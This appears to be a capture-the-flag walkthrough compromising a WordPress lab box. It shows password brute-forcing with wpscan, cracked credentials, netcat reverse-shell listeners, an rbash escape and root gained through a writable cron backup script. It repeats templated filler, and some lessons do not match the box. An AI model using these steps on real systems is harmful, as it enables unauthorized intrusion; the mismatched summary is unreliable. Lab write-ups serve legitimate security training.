## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web-based initial access |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---

*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
wpscan --url http://funbox.fritz.box/ -U admin,joe -P /usr/share/wordlists/rockyou.txt -t 50
```

```bash
❌[4:41][CPU:0][MEM:57][TUN0:192.168.45.180][/home/n0z0]
🐉 > wpscan --url http://funbox.fritz.box/ -U admin,joe -P /usr/share/wordlists/rockyou.txt -t 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://funbox.fritz.box/ [192.168.104.77]
[+] Started: Fri Jan 30 04:45:24 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://funbox.fritz.box/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://funbox.fritz.box/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://funbox.fritz.box/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://funbox.fritz.box/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://funbox.fritz.box/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <========================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - joe / 12345
[SUCCESS] - admin / iubire
Trying admin / cheyenne Time: 00:00:20 <                                                                                       > (700 / 28689492)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: joe, Password: 12345
 | Username: admin, Password: iubire

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 30 04:46:03 2026
[+] Requests Done: 873
[+] Cached Requests: 6
[+] Data Sent: 286.235 KB
[+] Data Received: 3.918 MB
[+] Memory used: 295.078 MB
[+] Elapsed time: 00:00:38

```


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
✅[18:44][CPU:70][MEM:59][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
www-data@funbox:/$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash

local.txt取得
```

www-data@funbox:/home/joe$ cat local.txt
aca8f875ecd7f2719575492d6a623ac4
www-data@funbox:/home/joe$
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

The web foothold was confirmed, but this target was more reliably progressed through SSH using the recovered credentials. The next step is to switch from the limited web execution context to an interactive user shell. We are looking for a successful SSH login prompt to establish a stable foothold for local enumeration.


*Caption: Visual confirmation before pivoting from web access to SSH-based shell access.*

❌[2:33][CPU:2][MEM:64][TUN0:192.168.45.180][/home/n0z0]
🐉 > ssh joe@$ip
joe@funbox:~$
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash

なんかエラーが出るからbashを別途起動
```

joe@funbox:~$ cd /hme-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier
-rbash: cd: restricted
joe@funbox:~$ cd /home
-rbash: cd: restricted
joe@funbox:~$ bash
joe@funbox:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Jun 19  2020 .
drwxr-xr-x 20 root  root  4096 Aug 14  2020 ..
drwxr-xr-x  3 funny funny 4096 Aug 21  2020 funny
drwxr-xr-x  5 joe   joe   4096 Aug 21  2020 joe
joe@funbox:/home$
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

No additional logs saved.

💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat mbox
```

```bash
joe@funbox:~$ cat mbox
From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131238.2D257446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root <root@funbox>

Hi Joe, please tell funny the backupscript is done.

From root@funbox  Fri Jun 19 13:15:21 2020
Return-Path: <root@funbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131521.8E2D4446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root <root@funbox>

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.

joe@funbox:~$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/funny/.backup.sh

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxrwxrwx 1 www-data www-data 3047 Jun 19  2020 /var/www/html/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'localhost');

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
./pspy64
```

```bash
www-data@funbox:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
2026/01/31 16:54:02 CMD: UID=0     PID=86052  | local -t unix
2026/01/31 16:55:01 CMD: UID=0     PID=86081  | tar -cf /home/funny/html.tar /var/www/html
2026/01/31 16:55:01 CMD: UID=0     PID=86080  | /bin/bash /home/funny/.backup.sh
2026/01/31 16:55:01 CMD: UID=0     PID=86079  | /bin/sh -c /home/funny/.backup.sh
2026/01/31 16:55:01 CMD: UID=0     PID=86078  | /usr/sbin/CRON -f


```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 4446
ls -la
cat proof.txt
```

```bash
❌[2:44][CPU:1][MEM:63][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4446
listening on [any] 4446 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.104.77] 51642
bash: cannot set terminal process group (88413): Inappropriate ioctl for device
bash: no job control in this shell
root@funbox:~# ls -la
ls -la
total 44
drwx------  6 root root 4096 Jan 30 16:40 .
drwxr-xr-x 20 root root 4096 Aug 14  2020 ..
lrwxrwxrwx  1 root root    9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jun 19  2020 .cache
drwx------  3 root root 4096 Jun 19  2020 .config
-rw-r--r--  1 root root   43 Aug 21  2020 flag.txt
-rw-------  1 root root  779 Jun 19  2020 mbox
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root joe    33 Jan 30 16:40 proof.txt
drwxr-xr-x  3 root root 4096 Jun 19  2020 snap
drwx------  2 root root 4096 Jun 19  2020 .ssh
root@funbox:~# cat proof.txt
cat proof.txt
448737bb7801ce618f6d2bb44f635658
root@funbox:~#

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
crontab -l
```

```bash
root@funbox:~# crontab -l
crontab -l

```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

### Attack Flow

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>21/22/80/33060]
        K1C[HTTP発見<br/>Port 80 Apache]
        K1D[リダイレクト確認<br/>funbox.fritz.box]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>WordPress発見"]
        direction TB
        K2A[hosts設定<br/>funbox.fritz.box追加]
        K2B[WordPress確認<br/>Version 5.4.2]
        K2C[WPScan実行<br/>ユーザー列挙]
        K2D[認証情報総当たり<br/>rockyou.txt]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>初期侵入"]
        direction TB
        K3A[認証情報発見<br/>joe:12345]
        K3B[認証情報発見<br/>admin:iubire]
        K3C[WP Dashboard<br/>ログイン成功]
        K3D[管理者権限確認<br/>Theme Editor利用可]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>RCE取得"]
        direction TB
        K4A[テーマ選択<br/>twentyseventeen]
        K4B[404.php編集<br/>Theme Editor]
        K4C[PHPシェル配置<br/>system関数]
        K4D[ペイロードテスト<br/>404.phpアクセス]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>シェル確立"]
        direction TB
        K5A[リスナー起動<br/>nc -lvnp 4444]
        K5B[リバースシェル<br/>404.php実行]
        K5C[www-dataシェル<br/>uid=33]
        K5D[local.txt取得<br/>aca8f875...]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>ラテラルムーブメント"]
        direction TB
        K6A[SSH接続<br/>joe:12345]
        K6B[rbash検出<br/>制限付きシェル]
        K6C[制限バイパス<br/>bash起動]
        K6D[メール確認<br/>cat ~/mbox]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>権限昇格準備"]
        direction TB
        K7A[メール内容解析<br/>backupscript言及]
        K7B[LinPEAS転送<br/>列挙スクリプト]
        K7C[書き込み可能発見<br/>.backup.sh rwxrwxrwx]
        K7D[pspy64実行<br/>プロセス監視]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格"]
        direction TB
        K8A[cron検出<br/>UID=0で*/5実行]
        K8B[スクリプト編集<br/>.backup.sh改変]
        K8C[リバースシェル追加<br/>192.168.45.180:4446]
        K8D[cron実行待機<br/>最大5分]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[rootシェル確立<br/>uid=0 gid=0]
        K9B[proof.txt取得<br/>448737bb...]
        K9C[crontab確認<br/>*/5実行確認]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#b2dfdb
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K9A fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
